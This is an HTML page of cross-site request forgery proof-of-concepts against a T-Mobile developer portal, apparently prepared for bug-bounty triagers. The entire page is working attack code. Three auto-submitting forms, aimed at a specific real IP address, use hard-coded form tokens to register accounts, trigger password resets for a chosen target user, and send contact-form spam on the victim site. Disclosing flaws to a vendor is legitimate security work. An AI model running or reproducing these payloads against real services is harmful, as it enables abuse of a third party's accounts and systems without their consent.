<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>CSRF PoCs — T-Mobile Developer Portal</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f2f2f2;
      padding: 30px;
    }
    .box {
      background: #fff;
      padding: 20px;
      border-radius: 8px;
      margin-bottom: 30px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    h2 {
      color: #c10000;
    }
    label {
      display: block;
      margin-top: 10px;
    }
    input[type="text"],
    input[type="email"],
    input[type="file"],
    input[type="url"],
    textarea {
      width: 100%;
      padding: 10px;
      margin-top: 5px;
      box-sizing: border-box;
    }
    button {
      margin-top: 15px;
      padding: 10px 20px;
      background-color: #0073e6;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }
    button:hover {
      background-color: #005bb5;
    }
  </style>
</head>
<body>

<h1>🔒 T-Mobile Developer Portal — CSRF PoCs (For Triagers)</h1>

<!-- 1. Registration -->
<div class="box">
  <h2>1️⃣ CSRF: Create New User Account</h2>
  <label>First Name:</label>
  <input type="text" id="firstName" placeholder="John" />

  <label>Last Name:</label>
  <input type="text" id="lastName" placeholder="Doe" />

  <label>Email Address:</label>
  <input type="email" id="email" placeholder="you@example.com" />

  <label>Desired Username:</label>
  <input type="text" id="username" placeholder="john_doe123" />

  <label>Picture (optional):</label>
  <input type="file" id="picture" disabled placeholder="Only for display; CSRF cannot attach file uploads" />

  <form id="registerForm" action="https://208.54.108.38/user/register" method="POST" target="_blank">
    <input type="hidden" name="first_name[0][value]" id="rFirstName" />
    <input type="hidden" name="last_name[0][value]" id="rLastName" />
    <input type="hidden" name="mail" id="rEmail" />
    <input type="hidden" name="name" id="rUsername" />
    <input type="hidden" name="contact_settings[contact]" value="1" />
    <input type="hidden" name="form_build_id" value="form-3m38T9XbSeee4rJbMfhopZyI7KAWoxWheWn_l23RPVQ" />
    <input type="hidden" name="form_id" value="user_register_form" />
    <input type="hidden" name="op" value="Create new account" />
    <button type="button" onclick="submitRegister()">Submit CSRF</button>
  </form>
</div>

<!-- 2. Password Reset -->
<div class="box">
  <h2>2️⃣ CSRF: Trigger Password Reset</h2>
  <label>Target Username or Email Address:</label>
  <input type="text" id="resetUser" placeholder="existing_user@example.com" />

  <form id="resetForm" action="https://208.54.108.38/user/password" method="POST" target="_blank">
    <input type="hidden" name="name" id="rResetUser" />
    <input type="hidden" name="form_build_id" value="form-uf6JiEnm4lcDirJQzXvzVRuzkia7x1lghNyRMdlX7Ro" />
    <input type="hidden" name="form_id" value="user_pass" />
    <input type="hidden" name="op" value="Submit" />
    <button type="button" onclick="submitReset()">Submit CSRF</button>
  </form>
</div>

<!-- 3. Contact Message -->
<div class="box">
  <h2>3️⃣ CSRF: Send Message via Contact Form</h2>
  <label>Your Name:</label>
  <input type="text" id="contactName" placeholder="Attacker Name" />

  <label>Your Email Address:</label>
  <input type="email" id="contactEmail" placeholder="attacker@example.com" />

  <label>Subject:</label>
  <input type="text" id="contactSubject" placeholder="Urgent: Please respond" />

  <label>Message:</label>
  <textarea id="contactMessage" rows="4" placeholder="This is a spam message sent via CSRF."></textarea>

  <form id="contactForm" action="https://208.54.108.38/contact" method="POST" target="_blank">
    <input type="hidden" name="name" id="cName" />
    <input type="hidden" name="mail" id="cEmail" />
    <input type="hidden" name="subject[0][value]" id="cSubject" />
    <input type="hidden" name="message[0][value]" id="cMessage" />
    <input type="hidden" name="form_build_id" value="form-2xjRm_-i82UDAsbVvdDeBiH0tlTvkdzMsgIgM8saX1k" />
    <input type="hidden" name="form_id" value="contact_message_feedback_form" />
    <input type="hidden" name="op" value="Send message" />
    <button type="button" onclick="submitContact()">Submit CSRF</button>
  </form>
</div>

<script>
  function submitRegister() {
    document.getElementById('rFirstName').value = document.getElementById('firstName').value;
    document.getElementById('rLastName').value = document.getElementById('lastName').value;
    document.getElementById('rEmail').value = document.getElementById('email').value;
    document.getElementById('rUsername').value = document.getElementById('username').value;
    document.getElementById('registerForm').submit();
  }

  function submitReset() {
    document.getElementById('rResetUser').value = document.getElementById('resetUser').value;
    document.getElementById('resetForm').submit();
  }

  function submitContact() {
    document.getElementById('cName').value = document.getElementById('contactName').value;
    document.getElementById('cEmail').value = document.getElementById('contactEmail').value;
    document.getElementById('cSubject').value = document.getElementById('contactSubject').value;
    document.getElementById('cMessage').value = document.getElementById('contactMessage').value;
    document.getElementById('contactForm').submit();
  }
</script>

</body>
</html>
